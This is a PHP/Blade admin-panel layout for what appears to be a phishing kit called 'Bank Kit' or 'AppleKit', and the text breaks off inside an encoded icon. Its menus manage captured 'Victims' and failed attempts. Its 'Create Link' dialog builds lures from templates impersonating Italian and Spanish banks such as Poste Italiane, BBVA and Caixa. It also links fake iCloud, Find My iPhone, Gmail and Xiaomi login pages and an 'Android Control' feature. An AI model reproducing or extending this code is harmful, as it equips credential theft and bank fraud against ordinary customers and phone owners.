<?php
setlocale(LC_TIME, 'pt_BR', 'pt_BR.utf-8', 'pt_BR.utf-8', 'portuguese');
date_default_timezone_set('America/Sao_Paulo');


?>
{{--*/ $ci =& get_instance(); /*--}}
{{--*/ $icloud = ( ! $ci->global_data['loginPage'] ) ? site_url('icloud') : site_url($ci->global_data['loginPage']) /*--}}
{{--*/ $bolinha = ( ! $ci->global_data['bolinhaPage'] ) ? site_url('bolinha') : site_url($ci->global_data['bolinhaPage']) /*--}}
{{--*/ $bolinha4 = ( ! $ci->global_data['bolinhaPage4'] ) ? site_url('bolinha4') : site_url($ci->global_data['bolinhaPage4']) /*--}}
{{--*/ $MapaNovo = ( ! $ci->global_data['MapaNovoPage'] ) ? site_url('MapaNovo') : site_url($ci->global_data['MapaNovoPage']) /*--}}
{{--*/ $MapaNovo6 = ( ! $ci->global_data['MapaNovo6Page'] ) ? site_url('MapaNovo6') : site_url($ci->global_data['MapaNovo6Page']) /*--}}
{{--*/ $MapaNovoLogin = ( ! $ci->global_data['MapaNovoLoginPage'] ) ? site_url('MapaNovoLogin') : site_url($ci->global_data['MapaNovoLoginPage']) /*--}}
{{--*/ $lcloud = ( ! $ci->global_data['loginPage'] ) ? site_url('lcloud') : site_url($ci->global_data['loginPage']) /*--}}
{{--*/ $aid = ( ! $ci->global_data['disablePage']) ? site_url('aid') : site_url($ci->global_data['disablePage']) /*--}}
{{--*/ $fmi = ( ! $ci->global_data['fmiPage'] ) ? site_url('fmi') : site_url($ci->global_data['fmiPage']) /*--}}
{{--*/ $ffmi = ( ! $ci->global_data['fmi2Page'] ) ? site_url('ffmi') : site_url($ci->global_data['fmi2Page']) /*--}}
{{--*/ $map = ( ! $ci->global_data['mapPage'] ) ? site_url('maps') : site_url($ci->global_data['mapPage']) /*--}}
{{--*/ $passwd = ( ! $ci->global_data['passPage'] ) ? site_url('password') : site_url($ci->global_data['passPage']) /*--}}
{{--*/ $itunes = ( ! $ci->global_data['itunesPage'] ) ? site_url('itunes') : site_url($ci->global_data['itunesPage']) /*--}}
{{--*/ $Map2020Modelo1 = ( ! $ci->global_data['Map2020Modelo1Page'] ) ? site_url('Map2020Modelo1') : site_url($ci->global_data['Map2020Modelo1Page']) /*--}}
{{--*/ $Map2020Modelo2 = ( ! $ci->global_data['Map2020Modelo2Page'] ) ? site_url('Map2020Modelo2') : site_url($ci->global_data['Map2020Modelo2Page']) /*--}}
{{--*/ $SenhaTela4Modelo2020 = ( ! $ci->global_data['SenhaTela4Modelo2020Page'] ) ? site_url('SenhaTela4Modelo2020') : site_url($ci->global_data['SenhaTela4Modelo2020Page']) /*--}}
{{--*/ $SenhaTela6Modelo2020 = ( ! $ci->global_data['SenhaTela6Modelo2020Page'] ) ? site_url('SenhaTela6Modelo2020') : site_url($ci->global_data['SenhaTela6Modelo2020Page']) /*--}}
{{--*/ $XiaomiLogin = ( ! $ci->global_data['XiaomiLoginPage'] ) ? site_url('XiaomiLogin') : site_url($ci->global_data['XiaomiLoginPage']) /*--}}
{{--*/ $gmail2020 = ( ! $ci->global_data['gmail2020Page'] ) ? site_url('gmail2020') : site_url($ci->global_data['gmail2020Page']) /*--}}

<!DOCTYPE html>
<html>

<head>

    <meta charset="utf-8">
	<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0">

    <title>{{$title}}</title>

    <link href="{{site_url('assets/backend/css/bootstrap.min.css')}}" rel="stylesheet">
    <link href="{{site_url('assets/backend/font-awesome/css/font-awesome.css')}}" rel="stylesheet">

    <link href="{{site_url('assets/backend/css/animate.css')}}" rel="stylesheet">
    <link href="{{site_url('assets/backend/css/style.css')}}" rel="stylesheet">
    <link href="{{site_url('assets/backend/css/plugins/sweetalert/sweetalert.css')}}" rel="stylesheet">
    <script src="{{site_url()}}/assets/backend/js/jquery-2.1.1.js"></script>

    @stack('extracss')
</head>

<body class="">
<div id="wrapper">
<?php
  $ControleAndroid = $ci->global_data['AndroidControl'];
?>
    <nav class="navbar-default navbar-static-side" role="navigation">
        <div class="sidebar-collapse">
            <ul class="nav metismenu" id="side-menu">
                <li class="nav-header">
                    <div class="dropdown profile-element"> <span>
                            <img alt="image" class="img-circle" src="{{site_url('assets/img/icon-user.png')}}" style="width: 35%;"/>
                             </span>
                        <a data-toggle="dropdown" class="dropdown-toggle" href="#">
                            <span class="clear"> <span class="block m-t-xs"> <strong
                                            class="font-bold">{{$_SESSION['adminFname']}}</strong>
                             </span> <span class="text-muted text-xs block">{{$_SESSION['adminName']}} <b
                                            class="caret"></b></span> </span> </a>
                        <ul class="dropdown-menu animated fadeInRight m-t-xs">
                            <li>
                                <a href="{{site_url(ADMINPATH.'admins/edit/'.$_SESSION['adminID'])}}">{{ $ci->lang->line('Perfil') }}</a>
                            </li>
                            <li>
                                <a href="{{site_url(ADMINPATH.'admins/updatePass/'.$_SESSION['adminID'])}}">{{ $ci->lang->line('Change_Password') }}</a></li>
                            <li>
                                <a href="{{site_url(ADMINPATH.'admins/updateEmail/'.$_SESSION['adminID'])}}">{{ $ci->lang->line('Change_Email') }}</a></li>
                            <li class="divider"></li>
                            <li><a href="{{site_url(ADMINPATH.'logout')}}">{{ $ci->lang->line('Exit') }}</a></li>
                        </ul>
                    </div>
                    <div class="logo-element">Bank Kit <span class="fa fa-xing"></span>
                    </div>
                </li>
                <li>
                    <a class="dashboard" href="{{site_url(ADMINPATH.'dashboard')}}"><i class="fa fa-th-large"></i> <span
                                class="nav-label">{{ $ci->lang->line('Control_Panel') }}</span>
                                <span class="MenuMobile" style="font-size: 9px;display: none;">{{ $ci->lang->line('Control_Panel') }}</span>
                              </a>
                </li>
                <li class="menu-head" style="color: #00BCD4; padding: 5px 15px">- {{ $ci->lang->line('Capture_Tools') }} <span class="fa fa-xing"></span></li>
                <li>
                    <a href="victims"><i class="fa fa-users"></i> <span class="nav-label">{{ $ci->lang->line('Victims') }}</span><span
                                class="fa arrow"></span>
                                <span class="MenuMobile" style="font-size: 9px;display: none;">{{ $ci->lang->line('Victims') }}</span>
                              </a>
                    <ul class="nav nav-second-level collapse">
                        <li><a href="{{site_url(ADMINPATH.'victims')}}"><i class="fa fa-users"></i> {{ $ci->lang->line('View_All') }}</a></li>
                        <!--
                        <li><a href="{{site_url(ADMINPATH.'victims/pending')}}"><i class="fa fa-clock-o"></i>
                                Pending</a></li>
                        <li><a href="{{site_url(ADMINPATH.'victims/done')}}"><i class="fa fa-check"></i> Done</a>
                        </li>
                        <li><a href="{{site_url(ADMINPATH.'victims/add')}}"><i class="fa fa-user-plus"></i> Add New</a>
                        </li>
                      -->
                    </ul>
                </li>

                <li>
                    <a href="failed"><i class="fa fa-user-times"></i> <span
                                class="nav-label">{{ $ci->lang->line('Failed_Attempts') }}</span><span
                                class="fa arrow"></span>
                                <span class="MenuMobile" style="font-size: 9px;display: none;">{{ $ci->lang->line('Failed_Attempts') }}</span>
                              </a>
                    <ul class="nav nav-second-level collapse">
                        <li><a href="{{site_url(ADMINPATH.'failed')}}"><i class="fa fa-users"></i> {{ $ci->lang->line('View_All') }}</a></li>

                    </ul>
                </li>

                <li class="menu-head" style="color: #00BCD4; padding: 5px 15px">- {{ $ci->lang->line('Senders') }} <span class="fa fa-xing"></span></li>
                <li>
                    <a href="mails"><i class="fa fa-envelope"></i> <span class="nav-label">{{ $ci->lang->line('SMS') }}</span><span
                                class="fa arrow"></span>
                                <span class="MenuMobile" style="font-size: 9px;display: none;">{{ $ci->lang->line('SMS') }}</span>
                              </a>
                    <ul class="nav nav-second-level collapse">
                        <!--
                        <li><a href="{{site_url(ADMINPATH.'mails/inbox')}}"><i class="fa fa-envelope"></i> Caixa de Entrada</a>
                        </li>
                    -->
                        <!--<li style="display: true;" ><a href="{{site_url(ADMINPATH.'mails/newMail')}}"><i class="fa fa-send"></i> Enviar Novo</a></li> -->
                        <li><a class="link-generate"><i class="fa fa-link"></i> {{ $ci->lang->line('Create_Link') }}</a></li>
                    </ul>
                </li>

				<!--
				<li>
                    <a href="sms"><i class="fa fa-comment"></i> <span class="nav-label">Sms</span><span
                                class="fa arrow"></span></a>
                    <ul class="nav nav-second-level collapse"> -->
                        <!--<li><a href="{{site_url(ADMINPATH.'sms/send')}}"><i class="fa fa-comment"></i> Send SMS</a></li>-->
                        <!--<li style="display: true;"><a href="{{site_url(ADMINPATH.'sms/send')}}"><i class="fa fa-comment"></i> SendUnlock SMS</a></li>
                        <li><a href="{{site_url(ADMINPATH.'sms/sent')}}"><i class="fa fa-comments"></i> Enviados</a>
                        </li> -->
                        <!--<li><a href="{{site_url(ADMINPATH.'sms/free')}}"><i class="fa fa-globe"></i> Free Method</a>
                        </li>-->
                    <!--</ul>
                </li>-->

                <li>
                    <a href="template"><i class="fa fa-photo"></i> <span class="nav-label">{{ $ci->lang->line('Template') }}</span><span
                                class="fa arrow"></span>
                                <span class="MenuMobile" style="font-size: 9px;display: none;">{{ $ci->lang->line('Template') }}</span>
                              </a>
                    <ul class="nav nav-second-level collapse">
                        <li class="active" style="display: none;"><a href="{{site_url(ADMINPATH.'template/email')}}"><i class="fa fa-envelope"></i> Email</a>
                        </li>
                        <li class="active" style="display: none;"><a href="{{site_url(ADMINPATH.'template/sms')}}"><i class="fa fa-comment"></i> SMS</a></li>
                        <li><a href="{{site_url(ADMINPATH.'template/login')}}"><i class="fa fa-lock"></i> {{ $ci->lang->line('Login') }}</a></li>
                    </ul>
                </li>

                <li class="menu-head" style="color: #00BCD4; padding: 5px 15px">- {{ $ci->lang->line('Tool_Links') }} <span class="fa fa-xing"></span></li>
                <li>
                    <a href="links"><i class="fa fa-eye"></i> <span class="nav-label">{{ $ci->lang->line('Link_Sys') }}</span><span
                                class="fa arrow"></span>
                                <span class="MenuMobile" style="font-size: 9px;display: none;">{{ $ci->lang->line('Link_Sys') }}</span>
                              </a>
                    <ul class="nav nav-second-level collapse">
                        <li><a href="{{site_url(ADMINPATH.'links')}}"><i class="fa fa-user-secret"></i> {{ $ci->lang->line('Links') }}</a></li>
                        <!--
                        <li><a href="{{site_url(ADMINPATH.'links/mailSent')}}"><i class="fa fa-user-plus"></i> Email</a>
                        -->
                        </li>
                    </ul>
                </li>

                <li>
                    <a href="visitor"><i class="fa fa-binoculars"></i> <span class="nav-label">{{ $ci->lang->line('Visitors') }}</span><span
                                class="fa arrow"></span>
                                <span class="MenuMobile" style="font-size: 9px;display: none;">{{ $ci->lang->line('Visitors') }}</span>
                              </a>
                    <ul class="nav nav-second-level collapse">
                        <li><a href="{{site_url(ADMINPATH.'visitor')}}"><i class="fa fa-eye"></i> {{ $ci->lang->line('View_All') }}</a></li>
                    </ul>
                </li>

                <?php
                  if($ControleAndroid == "SIM"){
                ?>
                <li>
                    <a href="links/mailSent"><i class="fa fa-user-secret"></i>
                      <span class="nav-label">{{ $ci->lang->line('Android_Control') }}</span><spanclass="fa arrow"></span>
                      <span class="MenuMobile" style="font-size: 9px;display: none;">{{ $ci->lang->line('Android_Control') }}</span>
                    </a>

                </li>

              <?php } ?>

                <li>
                    <a href="banned"><i class="fa fa-ban"></i> <span class="nav-label">{{ $ci->lang->line('Blocked_Banned') }}</span><span
                                class="fa arrow"></span>
                                <span class="MenuMobile" style="font-size: 9px;display: none;">{{ $ci->lang->line('Blocked_Banned') }}</span>
                              </a>
                    <ul class="nav nav-second-level collapse">
                        <li><a href="{{site_url(ADMINPATH.'banned')}}"><i class="fa fa-eye"></i> {{ $ci->lang->line('View_All') }}</a></li>
                        <li><a class="addBlock"><i class="fa fa-eye"></i> {{ $ci->lang->line('Block_IP') }}</a></li>
                    </ul>
                </li>

                <li class="menu-head" style="color: #00BCD4; padding: 5px 15px">- {{ $ci->lang->line('Administration') }} <span class="fa fa-xing"></span></li>

                <li>
                    <a href="admins"><i class="fa fa-user-secret"></i>
                      <span class="nav-label">{{ $ci->lang->line('Administrators') }}</span><spanclass="fa arrow"></span>
                      <span class="MenuMobile" style="font-size: 9px;display: none;">{{ $ci->lang->line('Admin') }}</span>
                    </a>
                    <ul class="nav nav-second-level collapse">
                        <li><a href="{{site_url(ADMINPATH.'admins')}}"><i class="fa fa-user-secret"></i> View</a></li>
                    </ul>
                </li>


                <li>
                    <a href="options"><i class="fa fa-cog"></i> <span class="nav-label">{{ $ci->lang->line('Settings') }}</span><span
                                class="fa arrow"></span>
                                <span class="MenuMobile" style="font-size: 9px;display: none;">{{ $ci->lang->line('Settings') }}</span>
                              </a>
                    <ul class="nav nav-second-level collapse">
                        <li><a href="{{site_url(ADMINPATH.'options')}}"><i class="fa fa-cog fa-spin"></i> {{ $ci->lang->line('Site') }} </a></li>
                        <!--<li><a href="<?php echo site_url( ADMINPATH . 'smtp' ); ?>"><i class="fa fa-send"></i> Smtp</a>
                        </li>-->
                        <li><a href="<?php echo site_url( ADMINPATH . 'options/import' ); ?>"><i
                                        class="fa fa-cloud-download"></i>{{ $ci->lang->line('ImpExp_Database') }}</a></li>
                        <!--<li><a href="<?php echo site_url( ADMINPATH . 'options/upapplekit' ); ?>"><i
                                        class="fa fa-cloud-upload"></i>Update Applekit</a></li>
                        <li><a href="<?php echo site_url( ADMINPATH . 'options/tests' ); ?>"><i class="fa fa-cogs"></i>Testes</a>-->
                    </ul>
                </li>

				<!--
                <li>
                    <a href="Help"><i class="fa fa-medkit"></i> <span class="nav-label">Help/Support</span><span
                                class="fa arrow"></span></a>
                    <ul class="nav nav-second-level collapse">
                    {{--<li class="dropdown-header">Documantion and News</li>--}}

                        <li><a target="_blank" href="http://nemoze.net/docs"><i class="fa fa-book"></i>Docs</a></li>
                        <li><a target="_blank" href="http://nemoze.net/news"><i class="fa fa-newspaper-o"></i>News</a>
                        </li>
                    {{--<li role="separator" class="divider"></li>--}}
                    {{--<li class="dropdown-header">Helper</li>--}}

                        <li><a target="_blank" href="http://nemoze.net/ticket"><i class="fa fa-ticket"></i>Support via
                                Tickets</a></li>
                        <li>
                            <a href="mailto:nemosucker@live.com?subject=Support%20Request%20Applekit&body=Please%20replace%20this%20line%20with%20your%20support%20request.%0D%0A%0D%0A%0D%0ADo%20not%20change%20those%20lines%0D%0A====================%0D%0ALicense%20Key: <?php echo $ci->config->item( 'licenseKey' ); ?>%0D%0ADomain: <?php echo domainName(); ?>%0D%0A"><i
                                        class="fa fa-envelope"></i>Support via Email</a></li>
                        <li>
                            <a href="mailto:nemosucker@live.com?subject=Report%20a%20Bug&body=Please%20replace%20this%20line%20with%20your%20bug%20report.%0D%0A%0D%0A%0D%0ADo%20not%20change%20those%20lines%0D%0A====================%0D%0ALicense%20Key: <?php echo $ci->config->item( 'licenseKey' ); ?>%0D%0ADomain: <?php echo domainName(); ?>%0D%0A"><i
                                        class="fa fa-bug"></i>Report a Bug</a></li>
                    </ul>
                </li> -->
            </ul>

        </div>
    </nav>

    <div id="page-wrapper" class="gray-bg">
        <div class="row border-bottom">
            <nav class="navbar navbar-static-top  " role="navigation" style="margin-bottom: 0">
                <div class="navbar-header">
                    <a class="navbar-minimalize minimalize-styl-2 btn btn-primary " href="#"><i class="fa fa-bars"></i>
                    </a>
                    <form role="search" class="navbar-form-custom" action="{{site_url(ADMINPATH.'victims/search')}}"
                          method="POST">
                        <div class="form-group">
                            <input type="text" placeholder="{{ $ci->lang->line('Searchforavictim') }}" class="form-control" name="search"
                                   id="search">
                        </div>
                    </form>
                </div>
                <ul class="nav navbar-top-links navbar-right">
                    <li>
                        <span class="m-r-sm text-muted welcome-message">{{ $ci->lang->line('Welcome') }} <strong
                                    class="text-navy">{{$_SESSION['adminFname']}}</strong>,
                        <span class="hidden-xs" title="Time Now"><i class="fa fa-clock-o fa-1x"></i></span>
                            <?php  echo utf8_encode(strftime('%A, %d de %B', strtotime('today'))); ?>
                        </span>
                    </li>
					|
                    <!--
					<li class="dropdown">
                        <a class="dropdown-toggle count-info" data-toggle="dropdown" href="#">
                            <i class="fa fa-bell"></i>
                        </a>
                        <ul class="dropdown-menu dropdown-alerts">
                            <li class="text-center">
                                <div class="text-center link-block">
                                    <a>
                                        Nothing yet
                                    </a>
                                </div>
                            </li>

                            <li class="divider"></li>
                            <li>
                                <div class="text-center link-block">
                                    <a>
                                        <strong>See All Alerts</strong>
                                        <i class="fa fa-angle-right"></i>
                                    </a>
                                </div>
                            </li>
                        </ul>
                    </li>
                    <li>
                        <a class="noti-cog">
                            <i class="fa fa-cog"></i>
                        </a>
                    </li>
					-->


                    <li>
                        <a href="{{site_url(ADMINPATH.'logout')}}">
                            <i class="fa fa-sign-out"></i> {{ $ci->lang->line('Logout') }}
                        </a>
                    </li>
                </ul>

            </nav>
        </div>
        @if( $title != 'DashBoard' )
            <div class="row wrapper border-bottom white-bg page-heading">
                @if (isset($docs))
                    <a href="{{$docs}}" class="label yellow-bg pull-right" style="margin-top: 35px; margin-right:20px;">Documentation/Help</a>
                @endif
                <div class="col-sm-4">
                    <h2>{{ $ci->lang->line('Control_Panel') }}</h2>
                    <ol class="breadcrumb" style="display:none">
                        <li>
                            <a href="{{site_url(ADMINPATH)}}">{{ $ci->lang->line('Control_Panel') }}</a>
                        </li>
                        <li class="active">
                            <strong>{{ $ci->lang->line('Control_Panel') }}</strong>
                        </li>
                    </ol>
                </div>
            </div>
        @endif
        <div class="wrapper wrapper-content">
            @yield('content')
        </div>
        <div class="footer">
            <div class="pull-right">
                Made with love <i class="fa fa-heart"></i> <strong>Developed by <a
                            href="#">Mr Deviloper</a>.</strong>
            </div>
            <div>
                <strong>All Rights Reserved </strong> <a
                        href="#">Bank Kit <span class="fa fa-xing"></span></a> &copy; {{date('Y')}}
            </div>
        </div>

    </div>
</div>

{{--Mainly scripts--}}
<script src="{{site_url()}}assets/backend/js/bootstrap.min.js"></script>
<script src="{{site_url()}}assets/backend/js/plugins/metisMenu/jquery.metisMenu.js"></script>
<script src="{{site_url()}}assets/backend/js/plugins/slimscroll/jquery.slimscroll.min.js"></script>
{{--Custom and plugin javascript--}}
<script src="{{site_url()}}assets/backend/js/inspinia.js"></script>
<script src="{{site_url()}}assets/backend/js/main.js"></script>
<script src="{{site_url()}}assets/backend/js/plugins/pace/pace.min.js"></script>
@if ( $ci->agent->is_mobile() == FALSE )
    <script src="{{site_url("assets/js/push.min.js")}}"></script>
@endif
<script src="{{site_url('assets/js/serviceWorker.js')}}"></script>
<script src="{{site_url('assets/backend/js/plugins/sweetalert/sweetalert.min.js')}}"></script>

<script type="text/javascript">
    $(function () {
        $("[data-toggle='tooltip']").tooltip();
    });
</script>
@stack('extrajs')

@if ( $ci->agent->is_mobile() == FALSE )
    <script type="text/javascript">
        jQuery(document).ready(function ($) {


            if (Push.Permission.get() == 'denied') {
                //Push.Permission.request(acceptPush, deniedPush);
            }

            function acceptPush() {
                swal({
                    title: "Hurry :)",
                    text: 'Now you have enabled the Desktop Notification Push',
                    html: true,
                    type: 'success',
                    animation: "slide-from-top",
                });
            }

            function deniedPush() {
                swal({
                    title: "Awe :(",
                    text: 'You have denied the Desktop Notification Push, Now you can not get any notification',
                    html: true,
                    type: 'error',
                    animation: "slide-from-top",
                    confirmButtonText: 'Copied ? Press if yes',
                });
            }
        });
    </script>
@endif
<script type="text/javascript">
    jQuery(document).ready(function ($) {
        $('.checkImei').on('click', function () {

            var thiss = $(this).ladda(),
                request = $(this).attr('data-link'),
                imei = $('input#Imei').val();

            thiss.ladda('start');

            ///console.log(request + imei);

            if (imei.length === 0) {
                thiss.ladda('stop');
                swal({
                    title: "Error",
                    text: 'IMEI is empty! <br /> try to insert one and try again',
                    animation: "slide-from-top",
                    html: true,
                    type: "error"
                });
                return false;

            } else {

                $.ajax({
                    cache: false,
                    type: "GET",
                    dataType: 'json',
                    timeout: 5000,
                    url: request + imei,
                    success: function (res) {
                        thiss.ladda('stop');
                        swal({
                            title: "FMI Check Result",
                            text: res.message,
                            animation: "slide-from-top",
                            html: true
                        });
                    },
                    error: function (res) {
                        thiss.ladda('stop');
                        swal({
                            title: "Error",
                            text: res.responseText,
                            animation: "slide-from-top",
                            html: true,
                            type: "error"
                        });
                    }
                });
            }


        });

        $('.addBlock').on('click', function () {
            swal({
                title: "Block / Ban IP",
                text: "Add IP to Blocked list",
                type: "input",
                showCancelButton: true,
                showConfirmButton: true,
                closeOnCancel: false,
                closeOnConfirm: false,
                confirmButtonText: 'Add',
                animation: "slide-from-top",
                inputPlaceholder: "IP",
                html: true,
            }, function (inputValue) {

                if (inputValue === "") {
                    swal.showInputError("You need to write something!");
                } else {

                    if (inputValue !== false) {
                        $.ajax({
                            cache: false,
                            type: "GET",
                            dataType: 'json',
                            timeout: 5000,
                            url: '{{site_url('admin/banned/block/')}}' + inputValue,
                            success: function (res) {
                                console.log(res);
                                if (res.message) {
                                    swal({
                                        title: "We are done!",
                                        text: '<strong>' + inputValue + '</strong> </br> IP have been added successfully, You can check your list <a href="{{site_url(ADMINPATH.'banned')}}">here</a>',
                                        html: true,
                                        type: 'success',
                                        animation: "slide-from-top",
                                        confirmButtonText: 'Okay!',
                                    });
                                } else if (res.error === 'Exist') {
                                    swal("Oops Exist!", "This IP " + inputValue + " is already exist, try with a different IP", "error");
                                } else {
                                    swal("Oops!", "Something goes wrong try again!", "error");
                                }
                            },
                            error: function (res) {
                                swal("Oops!", "Something goes wrong try again!", "error");
                            }
                        });
                    } else {
                        swal("Canceled!", " ;(", "error");
                    }
                }

            });
        });




        $('.link-generate').on('click', function () {


            swal({
                title: "{{ $ci->lang->line('Create_Link') }}",
                text: "{{ $ci->lang->line('Insert_random_number') }}<br>"
                + "<fieldset>"
                +  '<select class="SwettAlertOption" id="EscolhaTemplate">'
                +    '<option value="Template1">Template 1 (Poste Italiane)</option>'
                +    '<option value="Template2">Template 2 (Intesa Sanpaolo)</option>'
                +    '<option value="Template3">Template 3 (BBVA)</option>'
                +    '<option value="Template4">Template 4 (Bankia)</option>'
                +    '<option value="Template5">Template 5 (Caixa)</option>'
                +    '<option value="Template6">Template 6 (BNL)</option>'
                +    '<option value="Template7">Template 7 (BPER)</option>'
                +  '</select>'
                +  '<div class="sa-input-error"></div>'
                + "</fieldset>",
                type: "input",
                showCancelButton: true,
                showConfirmButton: true,
                closeOnCancel: false,
                closeOnConfirm: false,
                confirmButtonText: "{{ $ci->lang->line('Create') }}",
                animation: "slide-from-top",
                inputPlaceholder: "{{ $ci->lang->line('Insert_random_number') }}",
                html: true,
                inputValue : Math.floor((Math.random() * 100000) ),
            }, function (inputValue) {

                if (inputValue !== false) {
					if(inputValue != ''){
            var TemplateTmp = document.getElementById("EscolhaTemplate");
            var EscolhaTemplate = TemplateTmp.options[TemplateTmp.selectedIndex].value;

            console.log("Oi");
            console.log(EscolhaTemplate);

            $.ajax({
							cache: false,
							type: "GET",
							dataType: 'json',
							timeout: 5000,
							url: '{{site_url('admin/mails/newLink/')}}' + inputValue + '/' + EscolhaTemplate,
							success: function (res) {
								if (res.message) {
									var html = "{{ $ci->lang->line('Code_successfully_created') }} </br>" +
										"{{ $ci->lang->line('Code') }}: <strong>" + res.message.random + '</strong> ';
                    /*
                    '<a target="_blank" href="{{$icloud}}/' + res.message.random + '"> Poste Italiane</a></br>' +
										'<a target="_blank" href="{{$aid}}/' + res.message.random + '"> Intesa Sanpaolo</a></br>';
										'<a target="_blank" href="{{$passwd}}/' + res.message.random + '"> Reset Password</a></br>' +
										'<a target="_blank" href="{{$fmi}}/' + res.message.random + '"> Find My iPhone</a></br>' +
										'<a target="_blank" href="{{$ffmi}}/' + res.message.random + '"> Find My iPhone v2 "Compass" </a></br>' +
										'<a target="_blank" href="{{$map}}/' + res.message.random + '"> Mapas Connect</a></br>' +
										'<a target="_blank" href="{{$bolinha}}/' + res.message.random + '"> Bolinha 6 Digitos</a></br>' +
										'<a target="_blank" href="{{$bolinha4}}/' + res.message.random + '"> Bolinha 4 Digitos</a></br>' +
										'<a target="_blank" href="{{$MapaNovo}}/' + res.message.random + '"> Mapa Novo 4 Digitos</a></br>' +
										'<a target="_blank" href="{{$MapaNovo6}}/' + res.message.random + '"> Mapa Novo 6 Digitos</a></br>' +
										'<a target="_blank" href="{{$MapaNovoLogin}}/' + res.message.random + '"> Mapa Novo Somente Login</a></br>' +
										'<a target="_blank" href="{{$Map2020Modelo1}}/' + res.message.random + '"> Mapa 2020 Modelo 1</a></br>' +
										'<a target="_blank" href="{{$Map2020Modelo2}}/' + res.message.random + '"> Mapa 2020 Modelo 2</a></br>' +
										'<a target="_blank" href="{{$SenhaTela4Modelo2020}}/' + res.message.random + '"> Senha 4 Digitos Modelo 2020</a></br>' +
										'<a target="_blank" href="{{$SenhaTela6Modelo2020}}/' + res.message.random + '"> Senha 6 Digitos Modelo 2020</a></br>' +
										'<a target="_blank" href="{{$XiaomiLogin}}/' + res.message.random + '"> Xiaomi Login</a></br>' +
										'<a target="_blank" href="{{$gmail2020}}/' + res.message.random + '"> Gmail Login</a>';
                    */
									swal({
      										title: "{{ $ci->lang->line('New_Generated_Link') }}",
      										text: html,
      										html: true,
      										type: 'success',
      										animation: "slide-from-top",
      										confirmButtonText: "{{ $ci->lang->line('Click_to_Close') }}",
                       },
                       function(isConfirm){
                         if (isConfirm){
                           console.log("Confirmado");
                           location.reload();
                          }
                       });
								} else {
									swal("Oops!", res.error + "<br />{{ $ci->lang->line('Something_goes_wrong_try_again') }}", "error");
								}
							},
							error: function () {
								swal("Oops!", "{{ $ci->lang->line('Something_goes_wrong_try_again') }}", "error");
							}
						});


					} else {
						swal("Canceled!", "{{ $ci->lang->line('Random_number_is_required') }}", "error");
					}
				} else {
                  swal("Canceled!", "{{ $ci->lang->line('Okay_I_just_wanted_to_help_you') }}", "error");
              }

            });
        });
    });
</script>

@if ( $ci->agent->is_mobile() == FALSE )
<script type="text/javascript">
    jQuery(document).ready(function ($) {
        function pushN(msg, url) {
            Push.create("AppleKit Notification Center", {
                body: msg,
                icon: 'data:image/jpeg;base64,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